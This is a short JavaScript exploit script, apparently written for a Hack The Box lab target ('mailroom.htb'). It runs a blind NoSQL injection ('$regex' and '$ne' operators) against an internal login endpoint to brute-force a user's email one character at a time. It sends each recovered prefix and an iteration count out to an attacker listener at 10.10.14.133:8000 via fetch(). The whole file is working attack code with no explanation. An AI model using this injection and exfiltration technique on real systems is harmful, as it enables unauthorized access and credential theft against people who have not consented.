var host ='http://10.10.14.133:8000';

const responses =[]



function check(guess){
    var success = false;
    var req = new XMLHttpRequest();
    req.open('POST','http://staff-review-panel.mailroom.htb/auth.php', false);
    req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    req.onreadystatechange = () => {
        if (req.readyState === XMLHttpRequest.DONE) {
            var code =  req.status ;
            success = req.responseText.length == 130;
        }
    }
    req.onerror = (e)=>{
        fetch(host+'?data=error', {'mode':'no-cors'})
    }
    req.send("email[$regex]=^"+guess+"&password[$ne]=1");
    //console.log("email[$ne]=1&password[$regex]=^"+guess);
    return success;
}

var guess = '';
var chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@_';

var stop =false;
var counter = 0;
while(!stop)
{
    var l = guess.length;
    counter++;
    for(i in chars){
        if(check(guess+chars[i])){
           guess += chars[i];
           fetch('http://10.10.14.133:8000?p='+guess)
       }
    }
    if(l === guess.length){
        stop = true;
        console.log('Stop after', counter, 'iterations')
    }
}
fetch('http://10.10.14.133:8000?i='+counter)

/*
if (check('[A-Za-z0-9]')){
    fetch('http://10.10.14.133:8000?pass='+guess)
}*/

